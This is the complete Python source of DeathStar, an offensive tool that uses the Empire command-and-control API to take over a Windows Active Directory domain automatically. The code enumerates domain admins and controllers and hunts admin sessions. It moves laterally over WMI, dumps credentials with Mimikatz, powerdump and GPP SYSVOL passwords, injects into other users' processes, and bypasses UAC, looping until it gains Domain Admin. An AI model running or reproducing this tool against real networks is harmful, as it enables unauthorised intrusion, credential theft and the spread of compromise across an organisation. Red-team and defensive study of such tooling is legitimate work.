#! /usr/bin/env python3

# Copyright (c) 2017-2018 byt3bl33d3r
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import requests
import argparse
import threading
import signal
import sys
import re
from termcolor import colored
from argparse import RawTextHelpFormatter
from time import sleep
from requests import ConnectionError


# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__version__ = '0.0.1'


class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def login(empire_username, empire_password):
    payload = {'username': empire_username,
               'password': empire_password}

    print_info('Powering up the Death Star')

    try:
        r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)

        if r.status_code == 200:
            token['token'] = r.json()['token']
        else:
            print_bad('I find your lack of faith disturbing... (Authentication Failed)')
            if debug: print_debug('Status Code: {} Response: {}'.format(r.status_code, r.text))
            sys.exit(1)
    except ConnectionError:
        print_bad('Connection Error. Check Empire RESTful API')  # Connection refused
        sys.exit(1)


def get_listener_by_name(listener_name='DeathStar'):
    r = requests.get(base_url + '/api/listeners/{}'.format(listener_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    return False


def start_listener(listener_options, listener_type='http'):
    r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params=token, headers=headers, json=listener_options, verify=False)
    if r.status_code == 200:
        r = r.json()
        print_info('Created Death Star listener => {}'.format(r))
        return r
    print(r.json())
    raise


def get_agents():
    r = requests.get(base_url + '/api/agents', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise


def get_agent_results(agent_name):
    r = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise


def run_shell_command(agent_name, command):
    payload = {'command': command}

    try:
        r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
        if r.status_code == 200:
            r = r.json()
            if debug: print_debug("Executed Shell Command => success: {} taskID: {}".format(r['success'], r['taskID']), agent_name)
            return r
        else:
            print_bad("Error executing shell command '{}': {}".format(command, r.json()), agent_name)
    except Exception as e:
        print_bad("Error executing shell command '{}': {}".format(command, e), agent_name)


def run_shell_command_with_results(agent_name, command):
    r = run_shell_command(agent_name, command)
    while True:
        for result in get_agent_results(agent_name)['results']:
            for entry in result['AgentResults']:
                if entry['taskID'] == r['taskID']:
                    if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
                    return entry['results']
        sleep(2)


def execute_module(module_name, agent_name, module_options=None):
    payload = {'Agent': agent_name}
    if module_options:
        payload.update(module_options)

    try:
        r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
        if r.status_code == 200:
            r = r.json()
            if debug: print_debug("Executed Module => success: {} taskID: {} msg: '{}'".format(r['success'], r['taskID'], r['msg']), agent_name)
            return r
        else:
            print_bad("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
    except Exception as e:
        print_bad("Error executing module '{}': {}".format(module_name, e), agent_name)


def execute_module_with_results(module_name, agent_name, module_options=None):
    r = execute_module(module_name, agent_name, module_options)
    while True:
        for result in get_agent_results(agent_name)['results']:
            done = False
            if len(result) > 0:
                for entry in result['AgentResults']:
                    if entry['taskID'] == r['taskID']:

                        # Here we fix a bunch of stuff because Empire does not give standard output for all modules
                        # This is for get_domain_sid because Empire doesn't have a "completed" string when its done
                        if module_name == 'powershell/management/get_domain_sid':
                            if 'S-1-5-21' in entry['results']:
                                done = True

                        # This is for powerdump because Empire doesn't have a "completed" string when it is done
                        if module_name == 'powershell/credentials/powerdump':
                                if ':500:' in entry['results']:
                                    done = True

                        # Empire returns "Job started: xxxxxx" as results but we need just the completed results
                        if ' completed' in entry['results']:
                            done = True

                        if done == True:
                            if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
                            return entry['results']
        sleep(2)


def get_agent_logged_events(agent_name):
    r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise


def get_stored_credentials():
    r = requests.get(base_url + '/api/creds', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise


def delete_all_agent_results():
    r = requests.delete(base_url + '/api/agents/all/results', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

###########################################################################################################################################


def get_domain_sid(agent_name):
    results = execute_module_with_results('powershell/management/get_domain_sid', agent_name)
    # results = Job started: XXXXXXS-1-5-... because Empire is missing \r\n after "Job started"
    if results.startswith('Job started: '):
        results = results[19:].strip()
    # This is here in case Empire fixes their shit and adds in the correct \r\n between Job started and the output
    else:
        results = results.split()[1]
    print_good('Got domain SID: {}'.format(results), agent_name)
    return results


def get_group_member(agent_name, group_sid, group_name,recurse=True):
    module_options = {'Identity': group_sid,
                      'Recurse': str(bool(recurse))}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_group_member', agent_name, module_options)
    results = results.strip().split('\r\n\r\n')[:-2]
    members = []
    for result in results:
        user = None
        domain = None
        for entry in result.split('\r\n'):
            if entry.startswith('MemberDomain'):
                domain = entry.split(':')[1].strip().split('.')[0].upper()
            if entry.startswith('MemberName'):
                user = entry.split(':')[1].strip()

        if user and domain: members.append('{}\{}'.format(domain, user))

    print_good("Found {} members of the {} group: {}".format(len(members), group_name, members), agent_name)

    return members


def get_domain_controller(agent_name):
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_domain_controller', agent_name)
    results = results.strip().split('\r\n')
    dcs = []
    for entry in results:
        if entry.startswith('Name'):
            dcs.append(entry.split(':')[1].strip())

    print_good('Found {} Domain Controllers: {}'.format(len(dcs), dcs), agent_name)

    return dcs


def get_domains(agent_name):
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_forest_domain', agent_name)
    results = results.strip().split('\r\n')
    domains = []
    for entry in results:
        if entry.startswith('Name'):
            domains.append(entry.split(':')[1].strip())

    print_good('Found {} Domains: {}'.format(len(domains), domains), agent_name)

    return domains


def get_computers(agent_name):
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_computer', agent_name)
    results = results.strip().split('\r\n\r\n')[:-2]
    computers = []
    for result in results:
        computer = None
        os = None
        for entry in result.split('\r\n'):
            if entry.startswith('name'):
                computer = entry.split(':')[1].strip().lower()
            if entry.startswith('operatingsystem') and not entry.startswith('operatingsystemversion'):
                os = entry.split(':')[1].strip()

        if computer and os: computers.append('{} => {}'.format(computer, os))

    print_good('Found {} Computers'.format(len(computers)), agent_name)
    for computer in computers:
        print('        {}'.format(computer))

    return computers


def get_os_version(agent_name):
    results = run_shell_command_with_results(agent_name, 'cmd /c ver')
    results = results.strip().split('\r\n')

    for entry in results:
        version = None
        if entry.startswith('Microsoft'):
            version = entry.split('[')[1].strip(']')
            version = entry.split(' ')[1]
            version = entry.split('.')[2]

    print_good('Agent is running on Windows build {}'.format(version), agent_name)

    # Going to be doing greater than or equal comparison on this in elevate def
    version = int(version)

    return version


def user_hunter(agent_name, threads):
    module_options = {'Threads': str(threads)}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/user_hunter', agent_name, module_options)
    results = results.strip().split('\r\n\r\n')[:-2]

    admin_sessions = []
    for section in results:
        session = {}
        for entry in section.split('\r\n'):
            if entry.startswith('UserDomain'):
                session['domain'] = entry.split(':')[1].strip().split('.')[0].upper()
            if entry.startswith('UserName'):
                session['username'] = entry.split(':')[1].strip()
            if entry.startswith('ComputerName'):
                session['hostname'] = entry.split(':')[1].strip()
            if entry.startswith('SessionFromName'):
                session['sessionfrom'] = entry.split(':')[1].strip()

        if session: admin_sessions.append(session)

    print_good('Found {} active admin sessions: {}'.format(len(admin_sessions), [session['sessionfrom'] for session in admin_sessions]), agent_name)

    return admin_sessions


def find_localadmin_access(agent_name, computer_name=''):
    module_options = {'ComputerName': computer_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
    results = results.strip().split('\r\n')

    # Empire prints the results as: "Job started: ABCDEFwindows10.lab.local\r\nwindows11.lab.local\r\n\n\r\n\n
    fixed_results = []
    for r in results:
        if r.startswith('Job started: '):
            r = r[19:]
        fixed_results.append(r)

    # Deletes the '\nFind-LocalAdminAccess completed!' string and a rogue '\n'
    results = fixed_results[:-2]

    if not computer_name:
        print_good('Current security context has admin access to {} hosts'.format(len(results)), agent_name)
    else:
        if not results:
            print_bad('Current security context does not have admin access to {}'.format(computer_name), agent_name)
        else:
            print_good('Current security context has admin access to {}'.format(computer_name), agent_name)

    return results


def get_gpo_computer(agent_name, GUID):
    module_options = {'ComputerIdentity': GUID}
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_gpo_computer', agent_name, module_options)
    results = results.strip().split('\r\n')

    # Deletes the '\nGet-GPOComputer completed!' string and a rogue '\n'
    results = results[:-2]

    print_good('GPO {} is applied to {} computers'.format(GUID, len(results)), agent_name)

    return results


def tokens(agent_name):
    pass
    #results = execute_module_with_results('powershell/credentials/tokens', agent_name)


def gpp(agent_name):
    results = execute_module_with_results('powershell/privesc/gpp', agent_name)
    results = results.split('\r\n\r\n')

    gpps = []
    for result in results:
        entries = result.split('\r\n')

        gpp = {}
        usernames = []
        passwords = []
        file = None
        for entry in entries:
            if entry.startswith('UserNames'):
                usernames = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if usernames:
                    usernames[0]  = usernames[0][1:]
                    usernames[-1] = usernames[-1][:-1]
                    # Some usernames get returned with '(built-in) appended to them, this takes care of that
                    usernames = [user.replace(' (built-in)', '') for user in usernames]

            if entry.startswith('Passwords'):
                passwords = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if passwords:
                    passwords[0]  = passwords[0][1:]
                    passwords[-1] = passwords[-1][:-1]

            if entry.startswith('File'):
                file_index = entries.index(entry)
                file = entry.split(':')[1].strip()
                for remainder in entries[file_index+1:]:
                    file += remainder.strip()

        if file and usernames and passwords:
            guid = file.split('\\')[6][1:-1]
            if not len(guid) == 36:
                raise

            if not list(filter(lambda v: v['guid'] == guid, gpps)) and ('BLANK' not in usernames):
                gpp['file'] = file
                gpp['guid'] = guid
                gpp['creds'] = dict(zip(usernames, passwords))
                gpps.append(gpp)

    print_good('Found {} GPO(s) containing credentials using GPP SYSVOL privesc'.format(len(gpps)), agent_name)

    return gpps


def get_loggedon(agent_name, computer_name='localhost'):
    module_options = {'ComputerName': computer_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_loggedon', agent_name, module_options)
    results = results.strip().split('\r\n')[2:-4]

    loggedon_users = []
    for entry in results:
        if not entry or entry.find('$') != -1 or entry.startswith('-'):
            continue
        entry = re.sub(' +', ' ', entry.strip())
        username, domain, *_ = entry.split()
        user = '{}\\{}'.format(domain, username)
        if user not in loggedon_users:
            loggedon_users.append(user)

    print_good('Found {} users logged into {}: {}'.format(len(loggedon_users), computer_name, loggedon_users), agent_name)

    return loggedon_users


def tasklist(agent_name, process=None, username=None):
    command = 'tasklist'
    if process:
        command += ' {}'.format(process)

    results = run_shell_command_with_results(agent_name, command)
    results = results.split('\r\n')[2:]
    processes = []

    for entry in results:
        # This is convoluted because it takes into account process names with multiple spaces
        entry = re.sub(' +', ' ', entry.strip()).split()

        pid_index = None
        for v in entry:
            if v.isdigit():
                pid_index = entry.index(v)
                break

        if len(entry[pid_index:]) == 5:
            pid, arch, user, _,_ = entry[pid_index:]
            name = ' '.join(entry[:pid_index])
        elif not pid_index and len(entry) == 1 and not entry[0].isdigit():
            processes[-1]['username'] = processes[-1]['username'] + entry[0]
        else:
            print(entry)
            raise

        if username and username == user:
            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
        else:
            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})

    print_good('Enumerated {} processes'.format(len(processes)), agent_name)

    return processes


def psinject(agent_name, process, listener='DeathStar'):
    module_options = {'Listener': listener}
    if process.isdigit():
        module_options['ProcId'] = str(process)
    else:
        module_options['ProcName'] = str(process)

    print_info('PSInjecting into process {}'.format(process), agent_name)
    execute_module('powershell/management/psinject', agent_name, module_options)


def invoke_wmi(agent_name, computer_name, listener='DeathStar', username='', password=''):
    module_options = {'ComputerName': computer_name,
                      'Listener': listener,
                      'UserName': username,
                      'Password': password}

    results = execute_module_with_results('powershell/lateral_movement/invoke_wmi', agent_name, module_options)
    if results.lower().startswith('invoke-wmi executed'):
        print_good('Spread laterally using {} to {}'.format('{} credentials'.format(username) if username and password else 'current security context',
                                                            computer_name), agent_name)

    elif results.startswith('error'):
        print_bad("Failed to spread laterally using {} to {}: '{}'".format('{} credentials'.format(username) if username and password else 'current security context',
                                                                           computer_name,
                                                                           results), agent_name)


def mimikatz(agent_name):
    results = execute_module_with_results('powershell/credentials/mimikatz/logonpasswords', agent_name)
    if results: print_good('Executed Mimikatz', agent_name)


def spawnas(agent_name, listener='DeathStar', cred_id='', username='', password=''):
    module_options = {'Listener': listener,
                      'CredID': str(cred_id),
                      'UserName': username,
                      'Password': password}

    print_info('Spawning new Agent {}'.format('with credentials for {}'.format(username) if username and password else 'using CredID {}'.format(cred_id)), agent_name)
    execute_module('powershell/management/spawnas', agent_name, module_options)


def bypassuac_eventvwr(agent_name, listener='DeathStar'):
    module_options = {'Listener': listener}

    print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
    execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)


def bypassuac_fodhelper(agent_name, listener='DeathStar'):
    module_options = {'Listener': listener}

    print_info('Attempting to elevate using bypassuac_fodhelper', agent_name)
    execute_module('powershell/privesc/bypassuac_fodhelper', agent_name, module_options)



def add_creds(credentials):

    try:
        r = requests.post(base_url + '/api/creds', params=token, headers=headers, json=credentials, verify=False)
        if r.status_code == 200:
            r = r.json()
            if debug: print_debug("Attempted credentials addition => success")
            return r
        else:
            print_bad("Error adding credentials: {}".format(credentials, r.json()))
            print_bad("JSON Status Code: {}, JSON Error: {}".format(r.status_code, r.reason))
            print_bad("JSON Message: {}".format(r.content))

    except Exception as e:
        print_bad("Exception adding credentials: {}".format(credentials, e))
        print_bad("JSON Status Code: {}, JSON Error: {}".format(r.status_code, r.reason))
        print_bad("JSON Message: {}".format(r.content))


def powerdump(agent_name):
    results = execute_module_with_results('powershell/credentials/powerdump', agent_name)
    #print_debug('POWERDUMP => results: {}'.format(results), agent_name)

    results = results.split('\r\n')

    user = None
    ntlm_hash = None

    for entry in results:
        if ':500:' in entry:
            # This is absolutely fucking stupid. But required. Remove: "Job started: XXXXXX" from the beginning of the resultant data
            if entry.startswith("Job started"):
                entry = entry[19:]

            user = entry.split(':')[0].strip()
            ntlm_hash = entry.split(':')[3].strip()
            #print_debug("POWERDUMP => user: {}, hash: {}".format(user, ntlm_hash), agent_name)

    print_good('Found local admin account {} (RID 500) with hash: {} '.format(user, ntlm_hash), agent_name)
    #credentials = {"credentials": [["credtype", "hash"], ["domain", "workgroup"], ["username", user], ["password", ntlm_hash], ["host", "all"]]}

    # FIXME: not sure why JSON requests are failing, tried multiple ways to submit the data
    #credentials = {
    #   'credentials': {
    #       'credtype': "hash",
    #       'domain': "workgroup",
    #       'username': user,
    #       'password': ntlm_hash,
    #       'host': None
    #   }
    #}
    #credentials = { "credentials": {"credtype":"hash", "domain":"workgroup", "username":user, "password":ntlm_hash, "host":""} }
    #add_creds(credentials)



#########################################################################################################################################


def recon(agent_name):
    if running_under_domain_account(agent_name):
        print_info('Starting recon', agent_name)

        domain_sid = get_domain_sid(agent_name)
        DA_group_sid = domain_sid + '-512'
        EA_group_sid = domain_sid + '-519'
        Administrators_group_sid = 'S-1-5-32-544'

        for member in get_group_member(agent_name, DA_group_sid, 'Domain Admins'):
            with lock:
                domain_admins.append(member)

        if args.additional_groups:
            for member in get_group_member(agent_name, EA_group_sid, 'Enterprise Admins'):
                with lock:
                    enterprise_admins.append(member)
            for member in get_group_member(agent_name, Administrators_group_sid, 'Administrators'):
                with lock:
                    administrators.append(member)

        for domain in get_domains(agent_name):
            with lock:
                domains.append(domain)

        for dc in get_domain_controller(agent_name):
            with lock:
                domain_controllers.append(dc)

        if args.find_computers:
            for computer in get_computers(agent_name):
                with lock:
                    computers.append(computer)


        if not domain_admins and not domain_controllers:
            print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
        else:
            # Now that we have DC and DA's, check if any previous agents were already winners
            check_for_win_prev_agents(agent_name)

        for session in user_hunter(agent_name, args.threads):
            with lock:
                if session['hostname'] not in priority_targets:
                    priority_targets.append(session['hostname'])
                if session['sessionfrom'] not in priority_targets:
                    priority_targets.append(session['sessionfrom'])

    with lock:
        del recon_threads[agent_name]


def elevate(agent_name):
    # Versions of Windows 10 >= 15007 Creators Update are not susceptible to bypassuac_eventvwr
    if agents[agent_name]['os'].lower().find('windows 10') != -1:
        version = get_os_version(agent_name)
        if version >= 15007:
            bypassuac_fodhelper(agent_name)
    else:
        bypassuac_eventvwr(agent_name)


def spread(agent_name):
    if running_under_domain_account(agent_name):
        if agents[agent_name]['username'] not in spread_usernames:
            with lock:
                spread_usernames.append(agents[agent_name]['username'])

            print_info('Starting lateral movement', agent_name)
            for box in priority_targets:
                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, computer_name=box):
                    invoke_wmi(agent_name, box)

            for box in find_localadmin_access(agent_name):
                # Do we have an agent on the box? if not pwn it
                if not agent_on_host(hostname=box):
                    invoke_wmi(agent_name, box)


def privesc(agent_name):
    if running_under_domain_account(agent_name):
        tried_domain_privesc = True

        print_info('Starting domain privesc', agent_name)
        for result in gpp(agent_name):
            computers = get_gpo_computer(agent_name, result['guid'])
            for username, password in result['creds'].items():
                for box in [target for target in priority_targets if target in computers]:
                    if not agent_on_host(hostname=box):
                        if '\\' not in username:
                            # These are local accounts so we append '.\' to the username to specify it
                            username = '.\\' + username
                        invoke_wmi(agent_name, box, username=username, password=password)

            for username, password in result['creds'].items():
                for box in computers:
                    if not agent_on_host(hostname=box):
                        if '\\' not in username:
                            username = '.\\' + username
                        invoke_wmi(agent_name, box, username=username, password=password)

    with lock:
        del privesc_threads[agent_name]

def check_for_win(agent_name):
    '''
    Checks for either local admin on domain controller or
    having domain admin credentials in high integrity agent
    '''
    if agents[agent_name]['username'] in domain_admins and agents[agent_name]['high_integrity']:
        print()
        print_good(colored('Got Domain Admin via security context - agent using domain admin account in high integrity process!', 'red', attrs=['bold']), agent_name)
        print_win_banner()
        signal_handler(None, None)

    # domain_controllers = ['host.lab.local'] but agent['hostname'] = 'HOST'. Hence the following list comprehension
    elif agents[agent_name]['hostname'].lower() in [x.split('.', 1)[0].lower() for x in domain_controllers] and agents[agent_name]['high_integrity']:
        print()
        print_good(colored('Got Domain Admin via security context - local admin on domain controller!', 'red', attrs=['bold']), agent_name)
        print_win_banner()
        signal_handler(None, None)


def check_for_win_prev_agents(recon_agent_name):
    for agent in get_agents()['agents']:
        agent_name = agent['name']
        # recon agent will do check_for_win right after these checks so no need to dupe
        if agent_name != recon_agent_name:
            check_for_win(agent_name)


def pwn_the_shit_out_of_everything(agent_name):
    '''
    This is the function that takes care of the logic for each agent thread
    '''
    if (not domain_controllers or not domain_admins) and not recon_threads:
        recon_threads[agent_name] = agent_name
        recon(agent_name)

    check_for_win(agent_name)

    for user in get_loggedon(agent_name):
        if user in domain_admins:
            print_good(colored('Found Domain Admin logged in: {}'.format(user), 'red', attrs=['bold']), agent_name)

            if agents[agent_name]['hostname'] not in priority_targets:
                with lock:
                    priority_targets.append(agents[agent_name]['hostname'])

    spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
    spread_threads[agent_name].start()

    if not args.no_domain_privesc:
        if not tried_domain_privesc and not privesc_threads:
            privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
            privesc_threads[agent_name].start()

    if agents[agent_name]['high_integrity']:
        # tokens(agent_name)
        print_info('Attempting powerdump', agent_name)
        powerdump(agent_name)

        # This doesn't need to be explorer, change it at will ;)
        for process in tasklist(agent_name, process='explorer'):
            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
                print_info('Found process {} running under {}'.format(process['pid'], process['username']), agent_name)
                psinject(agent_name, process['pid'])
                with lock:
                    psinject_usernames.append(process['username'])

        if not args.no_mimikatz and agents[agent_name]['os'].lower().find('windows 7') != -1:
            mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
            mimikatz_thread.daemon = True
            mimikatz_thread.start()

    if not agents[agent_name]['high_integrity']:
        if not agent_on_host(hostname=agents[agent_name]['hostname'], high_integrity=True):
            elevate(agent_name)

    # We want to limit the amount of agents we spawn
    spawned_agents = 0
    for cred in get_stored_credentials()['creds']:
        if cred['credtype'] == 'plaintext':
            account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])

            if (account not in spread_usernames) and (account not in psinject_usernames) and (account not in spawned_usernames):
                with lock:
                    spawned_usernames.append(account)

                spawnas(agent_name, cred_id=cred['ID'])
                spawned_agents += 1

        if spawned_agents == 2:
            break

############################################################################################################################################


def running_under_domain_account(agent_name):
    hostname = agents[agent_name]['hostname']
    username = agents[agent_name]['username']

    if username.split('\\')[0] != hostname and username.split('\\')[1] != 'SYSTEM':
        return True
    return False


def agent_on_host(hostname=None, ip=None, high_integrity=None):
    agent_on_host = False
    for name, info in agents.items():
        if hostname and info['hostname'].lower() == hostname.split('.')[0].lower():
            if high_integrity is not None and high_integrity != info['high_integrity']:
                continue
            agent_on_host = True
            break

        elif ip and info['ip'] == ip:
            if high_integrity is not None and high_integrity != info['high_integrity']:
                continue
            agent_on_host = True
            break

    return agent_on_host


def agent_finished_initializing(agent_dict):
    '''
    If these values are None it means the agent hasn't finished initializing on the target
    '''
    if agent_dict['username'] is None or agent_dict['hostname'] is None or agent['os_details'] is None:
        return False
    return True


def print_info(msg, agent_name=None):
    print(colored('[*]', 'blue') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_good(msg, agent_name=None):
    print(colored('[+]', 'green') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_bad(msg, agent_name=None):
    print(colored('[-]', 'red') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_debug(msg, agent_name=None):
    print(colored('[DEBUG]', 'cyan') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)


def print_win_banner():
    print('\n')
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))


def signal_handler(signal, frame):
    print('\n')
    print_info('Powering down...')
    #print_info('Killing recon threads')
    #for name, thread in recon_threads.items():
    #    thread.kill()

    print_info('Killing spread threads')
    for name, thread in spread_threads.items():
        thread.kill()

    print_info('Killing privesc threads')
    for name, thread in privesc_threads.items():
        thread.kill()

    print_info('Killing agent threads')
    for name, thread in agent_threads.items():
        thread.kill()

    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':

    args = argparse.ArgumentParser(description='''

             _______   _______     ___   .___________. __    __          _______.___________.    ___      .______
            |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \
            |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |
            |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /
            |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
            |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|

                                                         Version: {}

    '''.format(__version__),
        formatter_class=RawTextHelpFormatter)
    args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username (default: empireadmin)')
    args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password (default: Password123)')
    args.add_argument('-lip', '--listener-ip', type=str, help='IP for the DeathStar listener (Empire should auto detect the IP, if not use this flag)')
    args.add_argument('-lp', '--listener-port', type=int, default=80, metavar='PORT', help='Port to start the DeathStar listener on (default: 8443)')
    args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
    args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
    args.add_argument('--no-domain-privesc', action='store_true', help='Do not use domain privilege escalation techniques (default: False)')
    args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
    args.add_argument('--find-computers', action='store_true', help='Find all computers in the domain and print during recon (default: False)')
    args.add_argument('--additional-groups', action='store_true', help='Display information about all domain privielged groups (default: False)')
    args.add_argument('--debug', action='store_true', help='Enable debug output')

    args = args.parse_args()

    headers = {'Content-Type': 'application/json'}
    token = {'token': None}

    tried_domain_privesc = False

    lock = threading.Lock()

    module_threads = args.threads
    base_url = args.url
    debug = args.debug
    find_computers = args.find_computers

    agents = {}

    agent_threads = {}
    recon_threads = {}
    privesc_threads = {}
    spread_threads = {}

    priority_targets = []    # List of boxes with admin sessions
    domain_controllers = []
    domains = []
    computers = []
    domain_admins = []
    enterprise_admins = []
    administrators = []
    spread_usernames = []    # List of accounts we already used to laterally spread
    psinject_usernames = []  # List of accounts we psinjected into
    spawned_usernames = []   # List of accounts we spawned agents with

    login(args.username, args.password)

    if not get_listener_by_name():
        listener_opts = {'CertPath': 'data/', 'Name': 'DeathStar', 'Port': args.listener_port}
        if args.listener_ip:
            listener_opts['Host'] = args.listener_ip

        start_listener(listener_opts)

    # delete_all_agent_results()

    print_info('Polling for agents')
    while True:
        for cred in get_stored_credentials()['creds']:
            if cred['credtype'] == 'plaintext':
                account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
                if account in domain_admins:
                    print('\n')
                    print_good(colored('Got Domain Admin via credentials!', 'red', attrs=['bold']) + ' => Username: {} Password: {}'.format(colored(account, 'yellow'),
                                                                                                                                            colored(cred['password'], 'yellow')))
                    print_win_banner()
                    signal_handler(None, None)
                    break

        for agent in get_agents()['agents']:
            agent_name = agent['name']
            if agent_name not in agents.keys() and agent_finished_initializing(agent):
                print_good(colored('New Agent'.format(agent['name']), 'yellow') + ' => Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['name'],
                                                                                                                                                           agent['external_ip'],
                                                                                                                                                           agent['hostname'],
                                                                                                                                                           agent['username'],
                                                                                                                                                           agent['high_integrity']))

                agents[agent_name] = {'id': agent['ID'],
                                      'ip': agent['external_ip'],
                                      'hostname': agent['hostname'],
                                      'username': agent['username'],
                                      'high_integrity': agent['high_integrity'],
                                      'os': agent['os_details']}

                check_for_win(agent_name)

                agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
                agent_threads[agent_name].start()

        sleep(1)

    sys.exit(0)
